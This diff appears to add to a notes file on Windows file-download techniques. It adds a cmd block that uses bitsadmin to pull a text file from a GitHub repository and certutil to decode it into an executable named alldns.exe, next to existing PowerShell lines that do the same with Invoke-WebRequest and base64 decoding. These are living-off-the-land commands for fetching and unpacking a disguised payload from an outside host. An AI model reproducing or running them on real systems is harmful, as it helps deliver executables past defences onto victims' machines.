@@ -32,3 +32,14 @@ Invoke-WebRequest https://github.com/xkill/test/raw/master/alldudns.txt -OutFile
 [IO.File]::WriteAllBytes('alldns.exe', [System.Convert]::FromBase64String((Invoke-WebRequest 'https://github.com/xkill/test/raw/master/alldudns.txt').Content))
 ```
 
+```cmd
+#bitsadmin /transfer type download /uri: https://github.com/xkill/test/raw/master/alldudns.txt /destination:%USERPROFILE%\Downloads\alldns.txt
+
+bitsadmin /create 1
+bitsadmin /addfile 1 https://github.com/xkill/test/raw/master/alldudns.txt %USERPROFILE%\Downloads\alldns.txt
+bitsadmin /RESUME 1
+bitsadmin /complete 1
+bitsadmin /reset
+
+certutil -decode [URL] %USERPROFILE%\Downloads\alldns.txt %USERPROFILE%\Downloads\alldns.exe
+```
